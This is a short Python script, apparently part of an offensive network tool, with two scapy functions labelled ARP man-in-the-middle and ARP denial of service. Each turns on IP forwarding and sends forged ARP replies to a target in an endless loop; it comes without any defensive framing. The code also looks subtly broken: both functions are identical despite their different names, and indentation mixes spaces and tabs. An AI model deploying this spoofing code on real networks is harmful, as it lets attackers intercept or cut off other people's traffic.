from scapy.all import *
import os

def ARPSpoof(IP, IPTarget): #-aM --ArpMitm
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward ")
	arp = ARP(op=ARP.is_at,psrc=IP,pdst=IPTarget)
	while True:
		time.sleep(1)
		send(arp)
def ARPDos(IP,IPTarget): #-aD --ArpDos
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward ")
	arp = ARP(op=ARP.is_at,psrc=IP,pdst=IPTarget)
	while True:
		time.sleep(1)
		send(arp)
